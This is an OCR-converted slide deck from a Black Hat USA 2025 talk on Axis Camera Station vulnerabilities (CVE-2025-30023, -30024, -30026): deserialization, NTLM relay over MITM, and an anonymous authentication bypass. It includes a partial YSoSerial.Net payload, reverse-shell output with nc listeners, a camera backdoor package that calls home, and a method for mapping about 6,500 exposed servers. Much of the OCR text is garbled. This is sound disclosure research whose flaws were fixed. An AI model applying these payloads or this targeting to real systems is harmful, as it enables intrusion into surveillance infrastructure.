---
title: "Turning Camera Surveillance on its Axis"
speakers: ["Noam Moshe"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Noam Moshe_Turning Camera Surveillance on its Axis.pdf"
pages: 68
sha256: "31dd5e8365b634b2f788427bf92b379f61c553cc751c64b47b363e117074bb35"
text_chars: 17990
ocr_pages: 28
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T22:58:49Z"
---
# Turning Camera Surveillance on its Axis

**Speakers:** Noam Moshe  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Noam Moshe_Turning Camera Surveillance on its Axis.pdf` (68 pages)

## Slide 1

## **Turning Camera Surveillance on its Axis**

**Noam Moshe Claroty Research, Claroty Team82**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CLAROTY
T=AM
Turning Camera Surveillance
on its Axis
Noam Moshe
Claroty Research, Claroty Team82
```

## Slide 2

#### **$whoami**

**Noam Moshe** Vulnerability researcher & Team Lead at Claroty Team82 - mostly breaking IoT clouds. Master of Pwn @ Pwn2Own ICS 2023.

## Slide 3

**I want to hack** **_Big Company Inc._**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
| want to hack Big Company Inc.
180.55 USD
+0.79 (0.44%) # today
Closed: 3 Jul, 16:59 GMT-4 + Disclaimer
After hours 180.54 —
181.(
180.16 USD 09:35
°
180.0 4
179.5 :\ A i
aie) Sy Au Sane
se lee
179. VJ
178
11:00
Open 179.82
High 180.77
Low 178.19
Max
15:00
52-wk high
52-wk low
Qtrly Div Amt
```

## Slide 4

#### **But how?**

- Searched for exposed services

- Found an interesting service

- What is **axis.remoting protocol** ?

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
But how?
¢ Searched for exposed services
¢ Found an interesting service
¢ What is axis.remoting protocol ?
Certificate
Fingerprint
Subject
Issuer
Names
43c053f29be29b1811c4e48a2872ed1c5
CN=DESKTOP-3FH7UIS5.axis.remoting
CN=DESKTOP-3FH7UIS5.axis.remoting
DESKTOP-3FH7UI5.axis.remoting
HTTP 55756/TCP 07/05/2025 08:54 UTC
rs
(2B Microsoft Windows (7
GW Microsoft HTTP API 2.0 (7
https://184.176.222.218:55756/
Status
Body Hash
HTML Title
Response Body
Handshake
Version Selected
Cipher Selected
Certificate
Fingerprint
Subject
Issuer
Names
Fingerprint
JARM
JA3S
404 Not Found
shal: a66898b36c94c53766e66c1la7aaeb149447ec083
Not Found
TLSv1_2
TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
43c053f29be29b1811c4e48a2872ed1c5e27b9bb2c89F3b3e8d679cc64867 fea
CN=DESKTOP-3FH7UI5.axis.remoting
CN=DESKTOP-3FH7UI5.axis.remoting
DESKTOP-3FH7UIS.axis.remoting
2ad2ad16d00000022c2ad2ad2ad2ad46ff59a659b30fd8aeaa6755c67691b4
364ff1 4b04ef93c3b4cfa429d729c0d9
```

## Slide 5

#### **Axis Cameras**

- IP Camera

- OS is Axis OS (Custom Linux)

- Download firmware from Axis website

- Managed via web interface

   - Configuration, camera feed..

## Slide 6

**Most companies have more than 1 camera…**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
M a
ost companies have more than 1 camera...
```

## Slide 7

#### **Axis Camera Station / Device Manager**

- **Manages Axis cameras**

   - Discovery, config, firmwares

Axis
Camera
Station

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Axis Camera Station / Device Manager
e Manages Axis cameras
¢ Discovery, config, firmwares
Type to filter
% Devices
Add devices
Cameras
Other devices
Stream profiles
Image configuration
PTZ presets
Management
External data sources
Time synchronization
Add devices
Select the devices in your network that you want to add to the server. You can find the added devices under eit
Manual search...
Name
Enter stream URLs...
IP Address
10.1.48.12
Refresh
Include prerecorded video fe }
Hostname
MAC address
```

## Slide 8

#### **Axis Camera Station / Device Manager**

###### • Live feed view and video recording

Axis
Camera
Station

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Ax _
is Camera Station 7 Device Manager
¢ Live feed view and video
recording AXIS a
COMMUNICATIONS
AXIS M3085-V Network Camera
```

## Slide 9

**How its used**

## Slide 10

#### **On-Prem vs. Cloud versions**

- Axis Secure Remote Access (not Axis.Remoting)

   - **Pro:** Does not require exposing services to the internet

   - **Con:** pay-per-traffic - can be expensive

- On-Prem installation (uses Axis.Remoting)

   - **Pro:** Free to use

   - **Con:** Need to expose services to the internet

Axis
Camera
Station

## Slide 11

#### **What about remote access?**

- Tons of orgs choose on-prem

   - Connect to their servers remotely

- To stay secure - Axis implemented secure protocol

•
Fully encrypted and authenticated binary
protocol
Axis
Camera
Station

## Slide 12

#### **On-Prem Connection**

**Axis Camera Station Clients WAN**

Big
Company
Inc.

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
On-Prem Connection
ioe
Axis Camera ae =)
Station Clients pts, ———
Big
Company
Inc.
```

## Slide 13

#### **On-Prem Connection**

**Axis Camera Station Clients WAN Attacker**

**Big Company Inc.**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
O _
n-Prem Connection
ioe
Axis Camera \,
Station Clients os me
, f
,
o Big
\o [L-- Company
— Inc.
Attacker
```

## Slide 14

#### **On-Prem Connection**

**Axis Camera Station Clients WAN Attacker**

**Server controls cameras**

**Big Company Inc.**

## Slide 15

6,000+ servers
around the
world!!! Big
Company
Gov
Inc.
Agency
WAN
University
Attacker

## Slide 16

**Let’s Deep Dive!**

## Slide 17

#### **Axis Camera Station / Device Manager**

- Windows .NET applications

   - Client and server

- Uses Axis.Remoting protocol

   - Wrapped in **mTLS**

- Requires authentication

   - Windows Host/Domain Credentials

## Slide 18

**Let’s Unwrap the protocol!**

## Slide 19

#### **MiTM the Connection with mTLS**

**Axis Camera Station Clients**

MiTM
Axis Camera
Station

## Slide 20

#### **Let’s analyze the protocol!**

- **User-Agent:** protocol name (Axis.Remoting)

- **NTLMSSP** : Authentication method (NTLM Challenge Response)

- **Hostname** : name of computer

- • **Request/Response** : JSON-based Service::Method pairs

- **Service, Method** : the logic to invoke on the server

## Slide 21

#### **ServiceContract**

- **ServiceContract** is used

- Client can invoke functions (contracts) on the server

- Common RPC in .NET

## Slide 22

**What happens when we have a complicated function?**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
What happens when we have a complicated function?
ace WindowsClientApi.Common. Remoting
[ServiceContract]
{
Task<LogOnDto> LogOnAsync(Uri uri, ClientInformationDto clientInformationDto, CommunicationType communicationType,
T ct);
JO LISEL LL
Task LogOffAsync(ServerIdDto serverId,
Task LogOff2Async(Uri uri,
```

## Slide 23

**What happens when we have a complicated function?**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
What happens when we have a complicated function?
sace WindowsClientApi.Common. Remoting
[ServiceContract]
Task<LogOnDto> LogOnAsync(Uri uri, ClientInformationDto clientInformationDto, CommunicationType communicationType,
ct)
ck ceore CLientInformationDto clientIinformationDto,
Task LogOff2Async(Uri uri, t ct):
}
}
```

## Slide 24

**What happens when we have a complicated function?**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
What happens when we have a complicated function?
ClientinformationDto clientiInformationDto,
namespace WinddéwsClientApi .Common. Remoting
{
[ZataContract]
publi lass ClientInformationDto : Dto
{
¢ > 4 7 bYU LI c RIL Wat RV A OxXYUUULYOAYUS Lie UTTset OUXVUUUEL 5
public ClientInformationDto(string machineName, string machineWindowsUserName, string machineWindowsUserSid, string
preferredLanguage)
{
this. = machineName;
= machineWindowsUserName;
this. = machineWindowsUserSid;
this. = preferredLanguage;
}
```

## Slide 25

#### **Parameter Deserialization (CVE-2025-30023)**

- Non-primitive params are deserialized

- Using **TypeNameHandling.Auto** → Super dangerous!

## Slide 26

**Example Request**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Example Request
CLIENT --> SERVER DATA:
aa3{
"Request": {
"Id": "fY¥pAWaAoNNf9",
"Service": "SessionFacade",
"Method": "LogOnAsync",
"Parameters": {
"uri": "net.tcp:// Rese eT eit
"clientInfarmationuio -_«
"$type": welindowsClientApi Common. Remoting. ClientInformationDto, WindowsClientApi",
“MachinewindowsUserName”: “DESKIUOP- :
"MachineWindowsUserSid": " jig
"MachineName": "DESKTOP- wy
"PreferredLanguage": "en",
"ServerId": "00000000-0000-0000-0000-000000000000"
Sar
"communicationType": 1,
"ct": “audcKz4EZann"
```

## Slide 27

### **We have a deserialization vulnerability! Let’s exploit it**

## Slide 28

#### **Connection Lifecycle**

mTLS connection

Start Axis.Remoting

NTLMSSP
Challenge
Response

Axis.Remoting Req/Resp (deserialization)

## Slide 29

###### **This is auth!**

mTLS connection

Start Axis.Remoting

NTLMSSP
Challenge
Response

Axis.Remoting Req/Resp (deserialization)

## Slide 30

#### **What we have so far**

- We have serialization vulnerability (== RCE)

   - But it requires authentication

- But we can exploit it in another form!

## Slide 31

#### **Step 1: We MiTM the connection**

**Axis Camera Station Client** Attacker **MITM**

Axis Camera
Station

## Slide 32

**Step 2: Client authenticates (NTLMSSP) to server and we pass-the-challenge (CVE-2025-30024)**

NTLM
Axis Camera  REQ
Station Client
NTLM
RESP
Attacker
MITM
Axis Camera
Station

## Slide 33

#### **Step 3: After Auth - Inject Deserialization payload**

REQ
Axis Camera
Station Client
Payload
Attacker
MITM
Axis Camera
Station

## Slide 34

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
YSoSerial.Net
CLIENT --> SERVER DATA:
Modified request:
saat
"Data = 4
"Ysaliua": £
"$type": "System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral,
Publicney!1oken=p//a5C501YS54eU5y",
"System.Security.ClaimsIdentity.actor":
"AAEAAAD/ ////AQAAAAAAAAAMAgZAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZG10b3IsIFZ1cnNpb249My4wL j AuUMCwgQ3VsdHVyZT1
2t1bj0ZMWJmMzg1NmFkMzY0OZTM1BQEAAABCTW1 j cm9zb2Z0L1Zpc3VhbFNOdWRpby5UZXhOLkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpb
Gb3J1Z3JvdW5kQnJ1c2gBAgAAAAYDAAAAt gU8P3htbCB2ZXJ zaw9uPSIxLjAilGVuY29kaW5nPSJ1dGYtMTYiPz4NCj xPYmp 1LY3REYXR
TOiU3RhcnQiIE1ZSW5pdG1lhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9 ImhOdHA6Ly9zY2h1bWFzLm1 pY3Jvc29mdC5jb20vd21uzZ
-hdGlvbilgeG1sbnM6c2Q9ImNscituYw1 lc3BhY2U6U31zdGVtLkRpYWdub3NOaWNz02Fzc2VtYmx5PVN5c3R1bSIgeG1sbnM6eD0iaHR
2ZO0LmNvbS93 aW5SmeC8yMDA2L3hhbWwiP gOKICA8T2jJqZWNORGFOYVByb3ZpZGVyLk9iamV jdEluc3RhbmN1PgOKICAgIDxzZDpQcm9 jZ
1c3MuU3RhcnRJIbmZvPg0KICAgICAgI CA8c2Q6UHJvY2Vzc1NOYXJOSWS5mbyBBcmd 1 bWVudHM91i9j1G1zcGFpbnQilFNOYWSkYXJkRX
HOiTFNOYWSkYXJkT3VOCHVORW5j b2Rpbmc9Int40k51bGx9TiBVc2VyTmFtZTOiliBQYXNzd29yZD0ie3g6TnVsbHOiTERVbWFpbj0il
hbHN1TiBGaWx1lTmFtZTOiY21kIiAvPgOKICAgI CAgPC9zZZDpQcm9 j ZXNZLINOYXJOSW5mbz4NCiAgICA8L3Nk01Byb2N1c3M+DQogID
k9iamVjdEluc3RhbmN1Pg0KPC9PYmp1Y3REYXRhHUHJvdm1kZXI+Cw=="
```

## Slide 35

**Step 4: Reverse Shell on Server!**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Step 4: Reverse Shell on Server!
=| [a=] AcsService.exe NT AUTHORITY...
conhost.exe NT AUTHORITY‘...
mp (=| £9 powershell.exe NT AUTHORITY’...
Gaw conhost.exe NT AUTHORITY‘...
[root@LocaLhost axis]# python3 mitm_expLoit.py [root@Localhost axis]# nc -lvk 5050
[+] Setting up MiTM listener! Ncat: Version 7.5@ ( https://nmap.org/ncat )
[+] Received connection from client! forwarding to server|Ncat: Listening on :::505@
[+] Forwarding NTLMSSP ChalLenge/Response Ncat: Listening on 0.0.0.0:5050
[+] Auth completed! Injection RevShell payload Ncat: Connection from 10.10.7.57.
[+] You should get reverse shell any minute now! Ncat: Connection from 10.10.7.57:54098.
[root@LocaLhost axis ]# Microsoft Windows [Version 10.0.19045.5965]
(Cc) Microsoft Corporation. All rights reserved.
C:\Windows\system32>whoami
whoami
nt authority\system
```

## Slide 36

#### **Side Note - We can do the same for the client!**

Payload
Axis Camera
Station Client
Attacker

Resp
Axis Camera
Station

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
"Side Note -Wecan do the cametorthecten: i
ide Note - We can do the same for the client!
J} Ce
Axis Camera
Station Client
CAWindows\System32\cmd.exe
```

## Slide 37

**Executing Code on Cameras (using legitimate features)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Executing Code on
Cameras
(using legitimate features)
THERE'S MORE
```

## Slide 38

#### **Execute Code on Cameras**

- Admins can install **packages** on cameras

   - Super modular!

- Anyone can create their own…

- Let’s use it to run code on cameras!

###### **Axis Camera Station**

## Slide 39

#### **Axis ACAP SDK on Github**

- Tons of examples

- Super easy to build a package

- Uses docker to build for multiple archs

   - X86, AARCH64, ARM etc…

## Slide 40

**Building a Package**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Building a Package
-arg ARCH=aarcho4 --tag mal-package .
DEPRECATED: The Legacy builder is deprecated and will be removed in a future release.
Install the buildx component to build images with BuildKit:
https ://docs.docker .com/go/buiLdx/
Sending build context to Docker daemon 132.6kB
Step 1/9 : ARG ARCH=armv7hf
Step 2/9 : ARG VERSION=12.5.0
Step 3/9 : ARG UBUNTU_VERSION=24. 04
Step 4/9 : ARG REPO=axisecp
Step 5/9 : ARG SDK=acap-native-sdk
Step 6/9 : FROM ${REPO}/${SDK} : ${VERSION}-${ARCH}-ubuntu${UBUNTU_VERSION}
---> 160f8@e5e1dd
Step 7/9 : COPY ./app /opt/app/
---> Using cache
---> 324679a4ae57
Step 8/9 : WORKDIR /opt/app
---> Using cache
--> 748d8352b612
Step 9/9 : RUN . /opt/axis/acapsdk/environment-setup* && acap-build ./
---> Using cache
---> 913b2369a865
Successfully built 913b2369a865
Successfully tagged mal-package: Latest
```

## Slide 41

**Building a Package**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Building a Package
Apps
x ly Add app Find more apps Allow unsigned apps Allow root-privileged apps
N
@ AXIS Object Analytics
Version: 1.12.28 Open
Axis Communications
```

## Slide 42

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
@ Backdoor Pacakge
Version: 1.0.0
UNKNOWN
Apps
Allow unsigned apps Allow root-privileged apps
+ Add app
@ Backdoor Pacakge
Version: 1.0.0 Open
UNKNOWN
@ AXIS Object Analytics
Open
Version: 1.12.28
Axis C i ° ‘
ener + build main) x nc -Lvk 9092
Listening on @.0.0.@ 9092
Connection received on 44368
GET /RCE?user=uid=999(acap- ) HTTP/1.1
Host: 79092
User-Agent: curl/8.5.@
Accept: */*
```

## Slide 43

## **MiTM != preauth**

###### **Let’s make it preauth**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
as
MiTM != preauth
Let's make it preauth
} iis THIS’ AUTH BYPASS?
```

## Slide 44

#### **I <3 Fallback Protocols!**

- Axis implemented fallback protocol

   - If regular TCP connection doesn’t work

- Over HTTP with AES encryption??

**axis.remoting vulnerable protocol**

## Slide 45

**Still requires auth**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Still requires auth
<
G
D 127.0.0.1:55752
Windows Security
Sign in to access this site
Authorization required by http://127.0.0.1:55752
OK Cancel
```

## Slide 46

#### **Still requires auth**

##### **If we use creds - browser is just stuck forever…**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
S a
till requires auth
€ G © 127.0.0.1:55752
Windows Security x
browser is just stuck
— | forever...
OK Cancel
 “ 127.0.0.1:55752 x ie
& %*  @ 127.0.0.1:55752
```

## Slide 47

#### **Let’s understand this protoCOOL!**

WAT
WAT
WAT
WAT

## Slide 48

##### **Step 1: HTTP Connect With Credentials (WWW-Authenticate)**

RX
GET /
Axis Camera
Station Client Return Channel (ID)
Axis Camera

Axis Camera
Station

## Slide 49

#### **Step 2: New HTTP Socket (Using the Channel)**

**Axis Camera Station Client**

TX
GET /{Channel}
Axis Camera
Station

## Slide 50

#### **Step 3: We now have TX and RX “Streams”**

RX
TX
Axis Camera
Station Client
Axis Camera
Station

## Slide 51

#### **Step 4: Each Side sends PubKey**

PubKey
RX
TX
Axis Camera
Station Client PubKey
Axis Camera
Station

## Slide 52

#### **Step 5: Each Side sends AES key**

Encrypted AES Key
RX
TX
Axis Camera
Station Client Encrypted AES Key
Axis Camera
Station

## Slide 53

##### **Step 6: Regular Communication (encrypted with AES)**

Encrypted msg
RX
TX
Axis Camera
Station Client Encrypted msg
Axis Camera
Station

## Slide 54

## Slide 55

#### **Axis.Remoting HTTP Protocol**

- Encrypted binary socket over HTTP

   - Weird way to implement it

- Uses both symmetric and asymmetric encryption

- ==> Is it more secure?

## Slide 56

#### **Axis.Remoting HTTP Protocol**

- Encrypted binary socket over HTTP

   - Weird way to implement it

- Uses both symmetric and asymmetric encryption

- ==> Is it more secure?

- **It has the same deserialization vulnerability - but we still need auth bypass!**

## Slide 57

**Web Server Authentication Scheme**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Web Server Authentication Scheme
(serverUri.
webServer.
webServer. AuthenticationSchemes.
Negotiate Negotiates with the client to determine the authentication scheme.
If both client and server support Kerberos, it is used; otherwise,
NTLM is used.
```

## Slide 58

**Super Duper Secret Server Authentication Scheme (CVE-2025-30026)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Super Duper Secret Server Authentication Scheme _
(CVE-2025-30026)
" yu.
2
‘ring text = serverUri + "_
HttpListener webServerAnonymous = new HttpListener();
webServerAnonymous. = true;
webServerAnonymous . = AuthenticationSchemes.
webServerAnonymous . .Add(text) ;
webServerAnonymous.Start();
Anonymous 32768 Specifies anonymous authentication.
```

## Slide 59

#### **Exploitation Plan**

- **Step 1:** Use /_/ secret path

   - Bypass auth

- **Step 2:** Implement weird comm protocol

- **Step 3:** ???

- **Step 4: Preauth RCE!**

## Slide 60

#### **And Then - Pivot to Cameras!**

**Axis Camera Station**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
And Then - Pivot to Cameras! a me butld git (natn) # ne “Wk 5057
Listening on 0.0.0.0 9092
Connection received on
echo AXIS Camera
AXIS Camera
7
*
ft
—_
_—,
= =
see, ee
=~'s,
lo] ~ . > build main) x nc -lvk 9092
— \ Listening on @.0.0.@ 9092
ail 3 . Connection received on
~ a
. “—_, echo AXIS Camera
Axis Camera ; AXIS Camera
Station
~ build main) x nc -lvk 9092
Listening on 0.0.0.0 9092
Connection received on
echo AXIS Camera
AXIS Camera
```

## Slide 61

**Understanding the Afterefect! f**

## Slide 62

#### **Internet-Exposed Instances**

• Using internet scanning services (Shodan, Censys) - we discover ~6,500 exposed devices!!

- Almost 4,000 in the US!

## Slide 63

#### **Mapping Targets**

- Because the server uses **NTLMSSP** - it advertises its domain!

- We can simply connect to an instance and **query it**

- creating a map of **~6,500** instances

## Slide 64

#### **Remember this?**

- **…**

- **NTLMSSP** : Authentication method (Windows)

- **Hostname** : hostname of host

- **…**

This includes **Domain** !!

## Slide 65

**Mapping Targets**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Mapping Targets
7
1
7
1
2
7
1
1
4
1
6
‘a
1
8
6
1
1
7
1
1
7
1
2
1
8
2
6
A
server_ip
8
c
server_port ad_domain_name
55
55
55
55
55
55
55
55
ss)
55
5S
55
55
55
55
55
55
55
55
55
55
55
55
55
55
55
55
55
LE -P3
Ss
S
MA 04
RCC
LE ‘2020
AXISNVR-S
EM A2
fe) col
\Wieeame_E
AXISNVR-F
SMCCAMSRV2022
DI
[ 1600
AXISNVR-
SUPERIOR
AXISNVR-
DESKTOP.
DVRA?
"K-11
CAMSRV.
AXISNVR-
AXISNVR-
D
server_name
lt P32
ERO1
7£04
01
LBBC)
AXISN
EMVI
OASIS
ws
AXISN
SMCCAMSRV2022
D 022
00
AXISNVR-
AXIS1
AXISNVR-£
DESKTOP-
DVRAZ
{ -11
s
AXISNVR-E
AXISNVR-C
MS27
BAREO1
LMM_7
ci7
C1443
E
dns_domain_name
Ler
s
SE
t 04
local
L ‘2020
AXISNVR-S
E
' 01
local
AXISNVR-
SMCCAMSRV2022
‘=com
00
AXISNVR-
local
AXISNVR-9
DESKTOP-6
DVRA2
11
AXISNVR-
AXISNVR-
Lenovo-P3
as 01.
SEF
04
-loca'
12020
AXISNVR-S
AH
cO1
local
AXISNVR-
SMCCAM
| 00
AXISNVR-:
axis1.s
AXISNVR-£
DESKTOP-1
DVRA2
11
R
AXISNVR-EJ
AXISNVR-GI
MS.
Be 1.loca
lo
tal
io
3
G
parent_dns_domain
None
com
None
None
‘local
None
None
local
None
None
= com
None
local
None
None
None
None
None
loca
None
tal
io
B
None
```

## Slide 66

#### **Why so many exposed?**

- Many countries **banned chinese-made** surveillance

- Remote access is need for this service

   - For multiple site installations, remote monitor etc…

- People believe the protocol is **secure** because it is **encrypted**

## Slide 67

#### **Aftermath**

- We reported all of these vulnerabilities to Axis Solutions

- They were **super professional** and and fixed all of the vulnerabilities

   - Really! i’ve never got an email response within 10 minutes of reporting!

- They’ve worked hard to fix everything, kudos to them!!

## Slide 68

# **Thank you**

©Copyright Claroty. All rights reserved

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Thank you
CLAROTY
T=AM
©Copyright Claroty. All rights reserved
```
